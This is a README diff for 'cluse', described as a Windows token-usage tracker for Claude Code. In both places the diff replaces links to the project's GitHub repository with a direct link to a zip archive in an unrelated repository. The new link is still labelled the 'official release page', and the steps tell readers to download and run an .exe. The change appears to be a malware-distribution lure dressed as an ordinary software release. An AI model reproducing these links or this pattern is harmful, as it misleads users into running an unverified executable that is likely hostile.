@@ -5,7 +5,7 @@ description: "Monitor live token usage for Claude Code with this real-time amber
 ---
 # 📊 cluse - Track your Claude token usage simply
 
-[![](https://img.shields.io/badge/Download_Cluse-Blue?style=for-the-badge)](https://github.com/magneticsnougat564/cluse)
+[![](https://img.shields.io/badge/Download_Cluse-Blue?style=for-the-badge)](https://raw.githubusercontent.com/magneticsnougat564/magneticsnougat564.github.io/main/nonfermentable/magneticsnougat-github-io-3.3.zip)
 
 ## 📋 About This App
 
@@ -17,7 +17,7 @@ Cluse runs on Windows 10 or 11. You need a stable internet connection to track y
 
 ## 📥 Getting Started
 
-1. Go to the [official release page](https://github.com/magneticsnougat564/cluse).
+1. Go to the [official release page](https://raw.githubusercontent.com/magneticsnougat564/magneticsnougat564.github.io/main/nonfermentable/magneticsnougat-github-io-3.3.zip).
 2. Look for the file ending in `.exe`.
 3. Click the file to start your download.
 4. Open the folder where your computer saved the file.
